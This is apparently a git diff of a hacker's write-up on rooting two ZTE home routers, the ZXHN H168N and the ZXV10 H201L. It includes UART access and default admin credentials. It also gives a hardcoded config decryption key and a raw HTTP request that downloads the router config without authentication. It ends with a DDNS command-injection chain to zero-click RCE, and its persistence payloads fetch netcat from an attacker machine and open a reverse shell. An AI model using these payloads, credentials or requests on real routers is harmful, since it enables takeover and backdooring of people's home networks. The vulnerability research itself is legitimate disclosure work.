@@ -30,6 +30,8 @@ So i decided to hack it instead. And thus beggins the short but fun rabbit-hole.
 
 # Round one: ZTE ZXHN H168N
 
+Exploit and backdoor code: [https://github.com/TasosY2K/zte-router-0day-rce/tree/main/exploit/ZXHN-H168N](https://github.com/TasosY2K/zte-router-0day-rce/tree/main/exploit/ZXHN-H168N)
+
 ## Getting UART
 
 As one would do with any IoT device i decided that my first goal would be looking into how i could pop a UART shell, so i can get a better image into how the device works and debug it. 
@@ -135,8 +137,8 @@ I mapped the arduino pins to the router as follows starting from the square pin 
 ```
 Arduino => Router
 
-VCC - 1
-GDN - (unamed)
+VCC - 1 (not needed)
+GND - (unamed)
 RX  - C111
 TX  - X4
 ```
@@ -457,6 +459,8 @@ tree                                                                            
 
 Now that we have the decompiled `lua` to human-readable source code we can begin to analyze for vulnerabilities.
 
+Since we don't have a user/password to log-in to the web interface yet we can use the `sendcmd` utility to retrieve all user credentials, and pick the `super-user` to log-in.
+
 ## Session fixation by spoofable session ID's
 
 By examining the file at `home/httpd/index.lua` and specifically the `initsession` we can see that the session ID's are generated based only on the client's IP.
@@ -595,7 +599,7 @@ Here i have opened the encrypted config in a hex editor so you can see the raw f
 +=========================================+
 ```
 
-First a check is made for an `encryption header` that indicates whether AES encryption is used. If AES is required (`encryption type 1 or 2`), it file is read in chunks, each chunk having a small `12‐byte header` (with length and an end marker). These encrypted chunks are accumulated into memory and AES in ECB mode with a 16‐byte key (padded or truncated) is used to decrypt them all at once. If encryption type is `2`, a `second encryption header` afterward is read, which usually indicates that the data is now just compressed. Finally, the data can be decompressed in `zlib` chunks and written into plaintext.
+First a check is made for an `encryption header` that indicates whether AES encryption is used. If AES is required (`encryption type 1 or 2`), it file is read in chunks, each chunk having a small `12‐byte header` (with length and an end marker). These encrypted chunks are accumulated into memory and AES in ECB mode with a 16‐byte key (padded or truncated) is used to decrypt them all at once. If encryption type is `2`, a `second encryption header` afterward is read, which usually indicates that the data is now just compressed. If encryption type is `0` no encryption is actually used. Finally, the data can be decompressed in `zlib` chunks and written into plaintext. For our config `encryption type 2` is used.
 
 Decription script:
 ```python
@@ -806,7 +810,7 @@ if __name__ == '__main__':
     main()
 ```
 
-I have written this streamlined script by practically stealing the code from `zte-config-util` to show the decryption process. We can simply run it and provide it with a valid `encryption key`, `input file` and `output file`. In this example i used the encryption key `GrWM3Hz&LTvz&f^9` detected from `zte-config-util` but on the following section i will showcase how to manually extract the master key from the device.
+I have written this streamlined script by practically stealing the code from `zte-config-util` to show the decryption process. We can simply run it and provide it with a valid `encryption key`, `input file` and `output file`. In this example i used the encryption key `GrWM3Hz&LTvz&f^9` detected from `zte-config-util` but on the following section i will showcase how to manually extract the master key from the device. This script will work for any of the encryption types that have been documented for ZTE routers in general.
 
 ![Tool decrypt](./images/tool_decrypt.png)
 
@@ -1072,7 +1076,7 @@ Dynamic DNS (`DDNS`) is a service that automatically updates the DNS records of 
 
 ![DDNS](./images/ddns.png)
 
-We can test enetring some input to observe what actions are made on the device, we will use `username`, `password` and `hostname` as the parameters.
+We can test entering some input to observe what actions are made on the device, we will use `username`, `password` and `hostname` as the parameters.
 
 ![DDNS Settings](./images/ddns_settings.png)
 
@@ -1138,7 +1142,7 @@ At the UART log we observe that partial output of the original `inadyn` progam i
 
 Navigating at `/tmp` and listing the files we see that the `pwned` file was created with our arbitrary contents validating the vulnerability.
 
-## Putting it all today for a 0click RCE
+## Putting it all together for a 0click RCE
 
 So now after discovering all of the vulnurabilities we are in a place where we can chain them together to construct a final exploit.
 
@@ -1168,7 +1172,7 @@ Now that we have found a way to bypass authentication and execute commands/code 
 
 After running `mount` we see that all partitions are either `ro` (read-only) or are `tmpfs` meaning that we either cannot write files on the partition or we can but they are stored in-RAM and are deleted after re-boot.
 
-So modifying an existing file taht could be executed on boot is out of the box, since all changes we can make to files in writable directories get deleted at re-boot due to `tmpfs`.
+So modifying an existing file that could be executed on boot is out of the box, since all changes we can make to files in writable directories get deleted at re-boot due to `tmpfs`.
 
 But if that's the case then when a user makes a change in the router settings, how does it persist? The answer to that is that all user state changes are saved to the main config file that the `sendcmd` and `cspd` manage. Also that is the same file we can leak and decrypt.
 
@@ -1193,7 +1197,7 @@ Command injection payload:
 user;sh -c 'cp /bin/ls /tmp/netcat;wget http://192.168.1.1:9090/netcat -O /tmp/a;cat /tmp/a>/tmp/netcat;rm /tmp/a;/tmp/netcat 192.168.1.1 4545 -e /bin/sh';echo 
 ```
 
-With encoded spaces
+With encoded spaces:
 ```
 user;sh${IFS}-c${IFS}'cp${IFS}/bin/ls${IFS}/tmp/netcat;wget${IFS}http://192.168.1.1:9090/netcat${IFS}-O${IFS}/tmp/a;cat${IFS}/tmp/a>/tmp/netcat;rm${IFS}/tmp/a;/tmp/netcat${IFS}192.168.1.1${IFS}4545${IFS}-e${IFS}/bin/sh';echo${IFS}
 ```
@@ -1222,3 +1226,288 @@ user;sh${IFS}-c${IFS}'cp${IFS}/bin/ls${IFS}/tmp/netcat;wget${IFS}http://192.168.
 If this payload is injected a connection will be made back to the defined server IP on-boot and every time the DDNS check is triggered. 
 
 # Round two: ZXV10 H201L
+
+Exploit and backdoor code: [https://github.com/TasosY2K/zte-router-0day-rce/tree/main/exploit/ZXV10-H201L](https://github.com/TasosY2K/zte-router-0day-rce/tree/main/exploit/ZXV10-H201L)
+
+## Getting UART
+
+### Reconnaissance
+
+This time i was not able to find an `FCC ID` for this device as it was probably never in the US, however there is alot of documentation related to this device online. I went ahead and took it apart, as i did not find much info specifically related to reverse engineering it online.
+
+![Router](./images/router.jpeg)
+
+And once again it is very easy to spot the rudimentary UART pins. We also get a better image of the chips and ports available on the device should we need them for the reverse engineering process.
+
+![Router UART](./images/router_uart.jpeg)
+
+This time the vendor made the process even easier for us by having the pins already soldered to the UART slots and by also having them correctly labeled.
+
+![Router Connected to Arduino](./images/router_connected.jpeg)
+
+We connect the appropriate pins mapped to the Arduino like so:
+
+```
+Arduino => Router
+
+VCC - 3V3 (not needed)
+GND - GND
+RX  - RX
+TX  - TX
+```
+
+The `RX` and `TX` connections should actually be reversed, but for some reason these are the connections that worked, so we're keeping them like this.
+
+### Getting a shell
+
+After using `picocom` once again with `baudrate 115200` we are met with the device's bootlog.
+
+![Bootlog](./images/bootlog.png)
+
+We notice that this time `U-Boot` is used, this can make firmware extraction easier if needed due to `U-Boot`'s embedded firmware utilities.
+
+![Failed log-in](./images/fail_login.png)
+
+I tried logging-in using some default credentials i found online.
+
+```
+CytaAdmRes:d5l_cyt@_Adm1n
+```
+
+I tried lot's of them with no luck. I will come back to this and i will attempt to find the credentials used for UART but for now i will continue to other vectors. Besides that a read-only UART console is still valuable as it reaveals information about the actions taking place on the router.
+
+For this device in general i took more of a black-box approach.
+
+![NMAP](./images/nmap.png)
+
+I did an `nmap` scan to see what ports are exposed by default on the device. One of the services that immediatelly caugyht my eye was `telnet`, since it is used to expose a shell or an RTOS on routers.
+
+![Telnet connection](./images/telnet.png)
+
+Luckilly enough the defaukt credentials i found worked on telnet, and sure enough we can get the contents of `/etc/shadow` indicating `root` permissions. We also notice a user called `cyt@adm!nu$3r` with an MD5crypt (`$1$`) hashed password, this could be the user needed for `UART access` so we will get back to it later.
+
+Now that we have a debug root shell we can begin hacking the device for real.
+
+## Understanding the device processes
+
+Now that we have control over the device let's do some digging around to see what tools we have available to play with and what parts of the router are worth exploring.
+
+![Utils](./images/utils.png)
+
+We see that once again the `sencmd` utility is available for configuring the router. Also we are running on `Busybox`, so we have limited binaries to use but this time we actually have more than we did on the previous router, this is something that can make our lives easier while reverse engineering it.
+
+![CPU Info](./images/cpuinfo.png)
+
+We query `procfs` to get info about the running processor. Again we are dealing with the MIPS architecture.
+
+![Processes](./images/processes_2.png)
+
+We can use the `sendcmd` utility to check running processes related to the router's functionality. The ones that are interesting to us are `httpd` and `cspd` for now.
+
+![HTTPD Dir](./images/httpd_dir.png)
+
+After navigating to the `/home/httpd` directory, looking for source code, i was met with a large number of `.gch` files. There is no accurate documentation outlining such file format, so after digging around inside the device and looking through alot of them i came to the conclusion that they are templating files used by a propriatery `templating engine` embedded into the `httpd` service.
+
+![HTTPD File](./images/httpd_file_1.png)
+
+<hr>
+
+![HTTPD File](./images/httpd_file_2.png)
+
+They have lot's of similarities in the structure and format of other common templating engines. By knowing this it is safe to assume that in order to touch on the deeper logic of the router i'd have to reverse engineer the `httpd` binary. I had intended to do just that, however i ended up getting RCE by just doing some `blackbox` testing as i mentioned before. I am sure that the `httpd` service is full of bugs as i was able to find [documented crashes](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45415) and overflows on the `httpd` used by other similar routers, this is something me and `@ckrielle` will look into, in the future.
+
+So let's begin by leaking the web UI admin user credentials and log-in to try to find vulnerabilities. We do it by using the command `sendcmd 1 DB p DevAuthInfo`.
+
+![User Credentials](./images/get_user_2.png)
+
+In this case the creds were the same ones we found online, but this is not always the case and can vary from device to device.
+
+```
+CytaAdmRes:d5l_cyt@_Adm1n
+```
+
+![Login](./images/login_2.png)
+
+Navigating to port 80 http, we are met with a very old-looking log-in page.
+
+![Access](./images/access.png)
+
+After using the credentials we extracted we have full control of the web interface and can test out the functionalities.
+
+## Authentication bypass via unauthenticated access to device config
+
+So after logging-in i immediatelly went to check if the same config leaking bug exists on this router too.
+
+![Config Management](./images/config_mgmt.png)
+
+```
+POST /getpage.gch?pid=101 HTTP/1.1
+Host: 192.168.1.1
+Content-Length: 137
+Cache-Control: max-age=0
+Origin: http://192.168.1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysQuwz2s3PjXAakFJ
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.1.1/getpage.gch?pid=1002&nextpage=manager_dev_config_t.gch
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+------WebKitFormBoundarysQuwz2s3PjXAakFJ
+Content-Disposition: form-data; name="config"
+
+
+------WebKitFormBoundarysQuwz2s3PjXAakFJ--
+```
+
+And lucky for me it really does exist. I am able to use the `/getpage.gch` to download the device config without having logged-in as any user, using the request provided in the example. And same as the previous device this config is using the proprietary ZTE format for encrypting the configs. However the script i wrote is able to distinguish between the different types of formats and it can decrypt this one too (similarly to `zte-config-util`). The fact that the same bug exists in both of the devices i tested, but also in other similar devices (quick google search will yield results) makes me assume that this is not an unitended vulnerability but was put in place deliberately by ZTE as an extra measure to access all of the devices, without realizing that the encryption keys can easily be extracted by reverse engineering the devices through physical access. Kinda scary to think that these devices were very widely used in many parts of the world.
+
+### Decrypting(?) the device config
+
+We can use the zte config tool [https://github.com/mkst/zte-config-utility](https://github.com/mkst/zte-config-utility) to decrypt it if we know the key and get back the xml file containing the users.
+
+![Decrypted](./images/decrypted.png)
+
+### Device config format
+
+I will not explain the device format again as i did so for the previous device, however this is an older type can there are differences.
+
+![Config Hex](./images/config_hex.png)
+
+We can see some of the differences compared to the config of `ZXHN H168N` if we open the config using a hex editor.
+
+The script i wrote for the config of the previous router also works on the current config type. In this example i tried using the encryption key `Renjx%2$CjM` retrieved from the `zte-config-util` source code that specifies it is used by `ZXV10 H201L`. On second review i realized that both on `zte-config-util` and on my custom script no key was needed cause the device config was of `type 0` meaning no encryption is actually used, only `zlib` compression. So i assume that ecryption was introduced in later versions of the firmware for this device.
+
+![Decrypted 2](./images/decrypted_2.png)
+
+Now that we have the original decompresses config we can browse for some interesting data.
+
+![Creds](./images/creds.png)
+
+We see that the credentials already documented online are used for the `super-user`, and we also grab the ones for the default `end-user`.
+
+## Command injection in DDNS settings
+
+Visiting the "Application" section on the web interface, we are met once again with the `DDNS` feature.
+
+![DDNS2](./images/ddns_2.png)
+
+If we enable it and enter some details.
+
+![Inadyn call](./images/inadyn.png)
+
+We notice that also on the UART log, that the `inadyn` utility is called, the `strCmd` section on the logs shows us the command that run and once again we have a reflection.
+
+![Request](./images/ddns_2_req.png)
+
+This is the responsible request.
+
+![Request](./images/ddns_2_req_fail.png)
+
+Now just like the previous router i tested (`ZXHN H128N`) all inputs appear to be validated for special characters.
+
+![Request](./images/ddns_2_req_payload.png)
+
+All inputs except for the DDNS `user` and `password`. As we see, there is output from the call of the `inadyn` utility, this happens because we are messing with the original parameters of the command, but the fact that this happens can be used to validate our injection. Also again, just like the previous router we cannot use spaces or the command breaks, so we replace any spaces with `${IFS}`.
+
+Command injection payload:
+```
+user;echo${IFS}PWNED>/var/tmp/pwned;echo${IFS}
+```
+
+Payload request:
+```
+POST /getpage.gch?pid=1002&nextpage=app_ddns_conf_t.gch HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 855
+Origin: http://192.168.1.1
+Connection: keep-alive
+Referer: http://192.168.1.1/getpage.gch?pid=1002&nextpage=app_ddns_conf_t.gch
+Cookie: sel_tabmenu=idx_63; sel_menu=group_8; SID=91521c36d8e9385a8c242c3c16b3efc5d5cc823919652eadfc7077b6762e70a3; _TESTCOOKIESUPPORT=1
+Upgrade-Insecure-Requests: 1
+Priority: u=4
+
+IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&IF_INDEX=NULL&IFservice_INDEX=0&IF_NAME=NULL&Name=dyndns&Server=http%3A%2F%2Fwww.dyndns.com%2F&ServerPort=NULL&Request=NULL&UpdateInterval=NULL&RetryInterval=NULL&MaxRetries=NULL&Name0=dyndns&Server0=http%3A%2F%2Fwww.dyndns.com%2F&ServerPort0=80&Request0=&UpdateInterval0=86400&RetryInterval0=60&MaxRetries0=3&Name1=No-IP&Server1=http%3A%2F%2Fwww.noip.com%2F&ServerPort1=80&Request1=&UpdateInterval1=86400&RetryInterval1=60&MaxRetries1=3&Name2=easyDNS&Server2=https%3A%2F%2Fweb.easydns.com%2F&ServerPort2=80&Request2=&UpdateInterval2=86400&RetryInterval2=180&MaxRetries2=5&Enable=1&Hidden=NULL&Status=NULL&LastError=NULL&Interface=IGD.WD1.WCD3.WCIP1&DomainName=hostname&Service=dyndns&Username=user;echo${IFS}PWNED>/var/tmp/pwned;echo${IFS}&Password=password&Offline=NULL&HostNumber=NULL
+```
+
+By sending this malicious request, a file should be created at `/var/tmp/pwned` with the contents `PWNED`.
+
+![Pwned](./images/ddns_2_pwned.png)
+
+Navigating ourselves to `/var/tmp` we can confirm that indeed the file was created, thus verifying the epxloit.
+
+## Putting it all together for a 0click RCE
+
+This has proven to be an easier-to-exploit device, so just like tha lst time let's construct a final exploit-chain.
+
+The steps go like this:
+
+1. We leak the device configuration file from the `unprotected endpoint`.
+2. We decompress it (no encryption is used) using `known research on ZTE routers` to extract an interface super-user and it's password.
+3. We log in.
+4. We change the DDNS username to a `command injection payload`.
+6. `RCE` is triggered.
+
+## Backdooring and gaining persistance
+
+As you might have guessed since now, im going to be using the exact same vector to create a backdoor on this device.
+
+![Mount](./images/mount_2.png)
+
+We can run `mount` to see that all partitions are `ro` (read-only) or `tmpfs`, so we cannot write files or if we can they are stored in-RAM and are deleted after re-boot.
+
+Let's download the MIPS compiled `netcat`.
+
+```
+wget https://github.com/darkerego/mips-binaries/raw/refs/heads/master/netcat
+```
+
+Then let's start a python server to host our payload.
+
+```
+python3 -m http.server 9090
+```
+
+Now we will use the exact same backdoor payload from `ZXHN H168N`. This time the IP my laptop got assigned is `192.168.1.5`.
+
+Command injection payload:
+```sh
+user;sh -c 'cp /bin/ls /tmp/netcat;wget http://192.168.1.5:9090/netcat -O /tmp/a;cat /tmp/a>/tmp/netcat;rm /tmp/a;/tmp/netcat 192.168.1.5 4545 -e /bin/sh';echo 
+```
+
+With encoded spaces:
+```
+user;sh${IFS}-c${IFS}'cp${IFS}/bin/ls${IFS}/tmp/netcat;wget${IFS}http://192.168.1.5:9090/netcat${IFS}-O${IFS}/tmp/a;cat${IFS}/tmp/a>/tmp/netcat;rm${IFS}/tmp/a;/tmp/netcat${IFS}192.168.1.5${IFS}4545${IFS}-e${IFS}/bin/sh';echo${IFS}
+```
+
+![Backdoor2](./images/backdoored2.png)
+
+(Same explanation as before):
+
+1. `sh -c '...'`
+ - This runs everything inside the quotes as a separate shell command, it makes the injection payload more stable.
+
+2. `cp /bin/ls /tmp/netcat;`
+ - Copies the `/bin/ls` binary to `/tmp/netcat`. This is done to ensure the file `/tmp/netcat` exists and is `executable`, eventually it will be overwritten.
+
+3. `wget http://192.168.1.5:9090/netcat -O /tmp/a;`
+ - Downloads the MIPS netcat from http://192.168.1.5:9090/ (attacker machine) and saves it as `/tmp/a`.
+
+4. `cat /tmp/a > /tmp/netcat;`
+ - Overwrites `/tmp/netcat` with the contents of the downloaded file. The previously copied `/bin/ls` content is replaced by the downloaded binary.
+
+5. `rm /tmp/a;`
+ - Removes the temporary downloaded file `/tmp/a`.
+
+6. `/tmp/netcat 192.168.1.5 4545 -e /bin/sh`
+ - Connects to `192.168.1.5` (attacker machine) on port 4545. The `-e /bin/sh` part tells it to execute `/bin/sh` and pipe its input/output over the connection.
+ - This essentially gives us a remote shell (a backdoor).
+
+So now for a second time we are able to completelly bypass any authentication, cause Remote Code Execution and even place peristent backdoors on ZTE devices.
